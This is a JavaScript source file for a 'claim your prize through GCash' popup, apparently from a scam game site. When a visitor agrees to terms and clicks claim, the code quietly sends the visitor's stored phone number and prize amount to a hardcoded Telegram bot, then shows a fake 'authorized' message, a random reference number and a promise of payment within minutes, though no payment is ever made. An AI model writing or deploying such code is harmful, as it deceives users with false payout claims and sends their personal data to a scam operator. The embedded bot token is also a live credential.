/**
 * Claim Popup Module - May Pre-conditioning (Agree/Authorize)
 */

let claimState = {
    isAgreed: false,
    isProcessing: false,
    currentAmount: 0
};

// Show the claim popup with pre-conditioning
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isAgreed = false;
    claimState.isProcessing = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const gcashBtn = document.getElementById('gcashClaimBtn');
    const agreeCheckbox = document.getElementById('agreeCheckbox');
    
    // Set prize amount
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    
    // Reset UI
    if(agreeCheckbox) agreeCheckbox.checked = false;
    gcashBtn.classList.remove('active', 'processing');
    gcashBtn.style.opacity = '0.5';
    gcashBtn.style.pointerEvents = 'none';
    gcashBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon-small" onerror="this.style.display=\'none\'"> Claim Thru GCash';
    
    // Show popup
    popup.style.display = 'flex';
}

// Hide popup
function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

// Handle agree checkbox change
function onAgreeChange(checkbox) {
    const gcashBtn = document.getElementById('gcashClaimBtn');
    claimState.isAgreed = checkbox.checked;
    
    if(checkbox.checked) {
        gcashBtn.classList.add('active');
        gcashBtn.style.opacity = '1';
        gcashBtn.style.pointerEvents = 'auto';
    } else {
        gcashBtn.classList.remove('active');
        gcashBtn.style.opacity = '0.5';
        gcashBtn.style.pointerEvents = 'none';
    }
}

// Handle GCash claim
function onGCashClaim() {
    if(!claimState.isAgreed) {
        alert("⚠️ Please agree to the terms and conditions first!");
        return;
    }
    
    if(claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const btn = document.getElementById('gcashClaimBtn');
    const amount = claimState.currentAmount;
    
    // Change button to processing state
    btn.classList.add('processing');
    btn.innerHTML = '<div class="rotating-green-o" style="width:20px;height:20px;border-width:3px;margin:0;"></div> AUTHORIZING...';
    
    // Simulate authorization process
    setTimeout(function() {
        // Send to Telegram for authorization
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        const message = `✅ AUTHORIZED CLAIM!\n📱 ${userPhone}\n💰 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
        
        // Send to Telegram
        fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
            .catch(e => console.log('Telegram error:', e));
        
        // Show success message
        btn.innerHTML = '✅ AUTHORIZED! Redirecting to GCash...';
        
        setTimeout(function() {
            alert("🎉 CLAIM AUTHORIZED!\n\nYour ₱" + amount.toLocaleString() + " will be sent to your GCash account within 3-5 minutes.\n\nReference: CP" + Math.floor(Math.random() * 1000000));
            
            // Reset and close
            claimState.isProcessing = false;
            hideClaimPopup();
            
            // Update main game balance to 0 after claim
            if(typeof GameState !== 'undefined') {
                GameState.balance = 0;
                if(typeof updateUI === 'function') updateUI();
                if(typeof saveData === 'function') saveData();
            }
        }, 1500);
    }, 2000);
}

// Initialize popup elements when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
    if(!document.getElementById('claimPopup')) {
        console.log('Popup container not found, will be added by main.html');
    }
});
